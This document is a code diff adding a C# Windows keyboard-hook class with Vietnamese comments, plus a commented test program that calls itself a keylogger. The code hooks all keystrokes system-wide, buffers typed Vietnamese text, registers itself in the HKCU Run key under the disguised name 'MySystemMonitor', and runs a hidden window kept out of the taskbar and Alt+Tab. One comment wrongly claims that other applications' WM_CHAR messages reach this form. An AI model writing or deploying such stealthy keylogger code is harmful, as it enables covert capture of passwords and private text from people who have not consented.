@@ -1,0 +1,204 @@
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.IO;
+using System.Text;
+
+namespace AgentForMe.Services
+{
+    public class KeyboardHook
+    {
+        // ================== PHẦN CŨ - GIỮ NGUYÊN HOÀN TOÀN ==================
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private const int WM_SYSKEYDOWN = 0x0104;
+
+        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        public IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+                return _hookID;
+            }
+        }
+
+        public IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                Console.WriteLine($"Phim đa đuoc bat: {(Keys)vkCode}");
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        public void SetPersistence()
+        {
+            try
+            {
+                RegistryKey rk = Registry.CurrentUser.OpenSubKey
+                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                rk.SetValue("MySystemMonitor", Application.ExecutablePath);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Không thể thiết lập Persistence: " + ex.Message);
+            }
+        }
+        // ================== HẾT PHẦN CŨ ==================
+
+        // ================== PHẦN MỚI: TẦNG APPLICATION (WM_CHAR) ==================
+        // Buffer lưu chuỗi văn bản đã compose từ UniKey (Telex/VNI)
+        private static StringBuilder _composedText = new StringBuilder();
+
+        // Hàm công khai để lấy chuỗi văn bản đã compose (dùng cho Program.cs)
+        public static string GetComposedText()
+        {
+            lock (_composedText)
+            {
+                return _composedText.ToString();
+            }
+        }
+
+        // Hàm công khai để xóa buffer nếu cần
+        public static void ClearComposedText()
+        {
+            lock (_composedText)
+            {
+                _composedText.Clear();
+            }
+        }
+
+        // Override WndProc để bắt WM_CHAR từ ứng dụng hiện tại (hoặc global nếu cần)
+        // Cách này hoạt động tốt khi ứng dụng của bạn có Form (Windows Forms)
+        public static void HandleApplicationKeyChar(Message m)
+        {
+            const int WM_CHAR = 0x0102;
+
+            if (m.Msg == WM_CHAR)
+            {
+                char ch = (char)m.WParam;
+                // Lọc bỏ control chars (Enter, Backspace sẽ xử lý riêng nếu cần)
+                if (ch >= 32 || ch == '\b' || ch == '\r' || ch == '\n')
+                {
+                    lock (_composedText)
+                    {
+                        if (ch == '\b') // Backspace
+                        {
+                            if (_composedText.Length > 0)
+                                _composedText.Length--;
+                        }
+                        else
+                        {
+                            _composedText.Append(ch);
+                        }
+                    }
+
+                    Console.WriteLine($"[Application Layer - UniKey Composed] Ký tự có dấu: {ch} (Unicode: U+{(int)ch:X4})");
+                    Console.WriteLine($"[Chuỗi hiện tại từ Telex/UniKey]: {_composedText}");
+                }
+            }
+        }
+        // =====================================================================
+    }
+}
+
+//////// test nóng (bỏ ra file program.cs để test
+/*
+using System;
+using System.Text; // Thêm để dùng UTF8
+using System.Windows.Forms;
+using System.Threading;
+using AgentForMe.Services;
+
+namespace AgentForMe
+{
+    static class Program
+    {
+        private static KeyboardHook keyboardHook;
+
+        // Callback cho low-level hook (phím thô)
+        private static IntPtr LowLevelCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            return keyboardHook.HookCallback(nCode, wParam, lParam);
+        }
+
+        // Form ẩn để bắt WM_CHAR từ tầng Application
+        private class HookForm : Form
+        {
+            protected override void WndProc(ref Message m)
+            {
+                KeyboardHook.HandleApplicationKeyChar(m);
+                base.WndProc(ref m);
+            }
+
+            protected override CreateParams CreateParams
+            {
+                get
+                {
+                    CreateParams cp = base.CreateParams;
+                    cp.ExStyle |= 0x80; // WS_EX_TOOLWINDOW: ẩn khỏi taskbar và Alt+Tab
+                    return cp;
+                }
+            }
+        }
+
+        [STAThread]
+        static void Main()
+        {
+            // === SỬA LỖI HIỂN THỊ TIẾNG VIỆT TRÊN CONSOLE ===
+            Console.OutputEncoding = Encoding.UTF8;
+            // Tùy chọn thêm: dùng font hỗ trợ Unicode tốt hơn (như Consolas hoặc Lucida Console)
+            // Nhưng UTF8 là đủ cho hầu hết trường hợp
+
+            keyboardHook = new KeyboardHook();
+
+            // 1. Keylogger phím thô (hardware/low-level)
+            IntPtr hookId = keyboardHook.SetHook(LowLevelCallback);
+            if (hookId == IntPtr.Zero)
+            {
+                Console.WriteLine("Không thể cài đặt Low-Level Keyboard Hook!");
+                return;
+            }
+            Console.WriteLine("Low-Level Keyboard Hook đã được cài đặt thành công (bắt phím thô).");
+
+            // Thiết lập persistence (tự chạy cùng Windows)
+            keyboardHook.SetPersistence();
+
+            // 2. & 3. Keylogger tầng Application + Chuỗi văn bản Telex
+            Console.WriteLine("Bắt đầu lắng nghe ký tự có dấu từ UniKey (tầng Application).");
+            Console.WriteLine("Gõ thử tiếng Việt bằng Telex để xem kết quả.\n");
+
+            // Chạy Form ẩn để nhận message WM_CHAR toàn hệ thống
+            // (Do low-level hook đã global, WM_CHAR từ các app khác sẽ được forward về Form này)
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new HookForm());
+
+            // Cleanup (thực tế ít khi tới vì Application.Run chạy mãi)
+            // UnhookWindowsHookEx(hookId); // Nếu cần có thể gọi từ sự kiện FormClosing
+        }
+    }
+}
+
+*/
